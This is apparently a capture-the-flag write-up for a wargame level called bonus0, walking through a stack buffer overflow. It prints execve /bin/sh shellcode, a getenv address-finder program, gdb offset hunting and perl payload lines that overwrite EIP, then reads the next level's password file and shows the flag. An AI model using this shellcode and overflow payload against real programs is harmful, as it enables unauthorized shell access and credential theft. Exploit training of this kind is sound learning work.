# bonus0

If we dissasemble the code, we see that we can copy 2 strings (get in stdin) in a larger string.

We want to execute a shellcode (actually we don't have any functions to exec `bin/ls` in the code).

It's impossible to do that because a shellcode is at least 23 char and the strings are 20 char...

An other way is to have the shellcode on an environnement variable and jump on this variable (do this by follow [this tutorial](https://www.hacktion.be/buffer-overflow-variable-environnement/)).

## Exploit
First, we can add the environnement variable that contains the shellcode.
```bash
export SHELLCODE="`perl -e 'print "\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80"'`"
```
Then, we need to know the variable address, add this C script, compile and execute it
```c
/* /tmp/getenv.c */

/*
compile:
gcc -g -w /tmp/getenv.c -o /tmp/getenv
execute (pwd = /tmp)
./getenv SHELLCODE
*/
#include <unistd.h>

int main(int ac, char ** av) {
	if (ac < 2)
		printf("./getenv <env-var-name>");
	else
		printf("%s address: 0x%lx\n", av[1], getenv(av[1]));
	return 0;
}
```
```bash
> gcc -g -w /tmp/getenv.c -o /tmp/getenv && cd /tmp && ./getenv SHELLCODE && cd -
SHELLCODE address: 0xbffff845
```

Then, we need to know how to overwrite the EIP to jump to `0xbffff845`:
```
> gdb bonus0
(gdb) $ run
 -
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
 -
BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB
...
(SEGFAULT) -> Invalid $PC address: 0x42424242
EIP: 0x42424242 ('BBBB')
```
So to overwrite the EIP, we need to send the address on the second string.

Get the offset of the EIP using our pattern program:
```bash
[computer]
> ./pattern.py create 200
AAA~AAA}AAA|AAA{AAAzAAAyAAAxAAAwAAAvAAAuAAAtAAAsAAArAAAqAAApAAAoAAAnAAAmAAAlAAAkAAAjAAAiAAAhAAAgAAAfAAAeAAAdAAAcAAAbAAAaAAA_AAA^AAA]AAA[AAA@AAA?AAA>AAA=AAA<AAA;AAA:AAA9AAA8AAA7AAA6AAA5AAA4AAA3AAA2AAA1
... gdb on VM
> ./pattern.py search 'AA|A' 200
found at offset: 9

[VM]
> gdb bonus0
(gdb) $ run
 -
01234567890123456789
 -
AAA~AAA}AAA|AAA{AAAzAAAyAAAxAAAwAAAvAAAuAAAtAAAsAAArAAAqAAApAAAoAAAnAAAmAAAlAAAkAAAjAAAiAAAhAAAgAAAfAAAeAAAdAAAcAAAbAAAaAAA_AAA^AAA]AAA[AAA@AAA?AAA>AAA=AAA<AAA;AAA:AAA9AAA8AAA7AAA6AAA5AAA4AAA3AAA2AAA1
(SEGFAULT) => Invalid $PC address: 0x417c4141
EIP: 0x417c4141 ('AA|A')
```
The offset if 9.

Finally, we need to send the environnement variable with an offset of 9 on the second string and we need to entirely fill the first string to send data on the second string (if we not fill the first string with random values, all the string will be read in the first `p` call).
```bash
# first p()     | second p()
# filled with A | offset of 9 | environ var addr | to have at least 20 char (no '\0' at the end)
# A * 4095  \n  | BBBBBBBBB   | \x45\xf8\xff\xb  | BBBBBBB
> perl -e 'print "A"x4095 . "\n" . "B"x9 . "\x45\xf8\xff\xbf" . "B"x7 . "\n"' > /tmp/a ; cat /tmp/a - | ./bonus0
cat /home/user/bonus1/.pass
cd1f77a585965341c37a1774a1d1686326e1fc53aaa5459c840409d4d06523c9
```

### Alternative
```
(perl -e 'print "A"x4095 . "\n" . "B"x9 . "\x26\xf8\xff\xbf" . "B"x(20 - 9 - 4) . "\n"'; cat) | ./bonus0
```

flag:
```
cd1f77a585965341c37a1774a1d1686326e1fc53aaa5459c840409d4d06523c9
```
